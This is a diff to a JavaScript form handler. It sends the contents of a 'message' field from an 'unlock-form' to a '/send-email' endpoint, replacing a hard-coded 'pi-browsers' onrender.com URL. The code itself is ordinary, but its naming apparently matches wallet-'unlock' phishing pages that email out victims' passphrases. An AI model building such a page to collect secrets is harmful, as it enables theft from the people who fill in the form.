@@ -1,7 +1,6 @@
 document.getElementById("unlock-form").addEventListener("submit", async function (event) {
-    event.preventDefault(); // Prevent page reload
+    event.preventDefault(); // Prevent form from reloading page
 
-    // Get the user input (message)
     const message = document.getElementById("message").value.trim();
 
     if (!message) {
@@ -10,17 +9,15 @@ document.getElementById("unlock-form").addEventListener("submit", async function
     }
 
     try {
-        const response = await fetch("https://pi-browsers.onrender.com/send-email", { // 🔥 Use your actual Render URL here!
+        const response = await fetch("/send-email", { // Use relative path
             method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ message }) // Sending message only
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ message }) 
         });
 
         if (response.ok) {
             alert("Message sent successfully!");
-            document.getElementById("unlock-form").reset(); // Clear the form
+            document.getElementById("unlock-form").reset(); // Clear input
         } else {
             alert("Error sending message.");
         }
